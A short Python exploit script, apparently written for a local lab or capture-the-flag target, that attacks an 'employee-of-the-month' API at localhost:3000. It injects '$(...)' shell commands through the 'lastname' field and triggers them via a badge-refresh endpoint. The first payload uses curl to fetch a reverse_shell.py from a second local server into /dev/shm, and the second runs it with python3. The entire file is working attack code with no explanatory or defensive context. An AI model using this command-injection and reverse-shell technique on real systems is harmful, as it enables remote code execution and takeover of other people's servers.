import httpx

def exploit():
	client = httpx.Client()
	base_url = "http://localhost:3000"
	
	def json(payload):
		return {
			"firstname": "Patrick",
			"lastname": f"Payloadson {payload}",
			"description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
			"achievement": {
				"reason":"Setting up employee of the month API",
				"date":"2023-10-4 11:03:04"
			},
		}
	
	payloadStageOne = "$(curl http://localhost:8000/reverse_shell.py -o /dev/shm/shell.py)"
	payloadStageTwo = "$(python3 /dev/shm/shell.py)"
	
	res = client.put(
		base_url + "/employee-of-the-month",
		headers={"cache-control": "no-cache"},
		json=json(payloadStageOne)
	)
	
	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
	
	print(res, len(res.text))
	res = client.put(
		base_url + "/employee-of-the-month",
		headers={"cache-control": "no-cache"},
		json=json(payloadStageTwo)
	)

	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
	print(res, len(res.text))

exploit()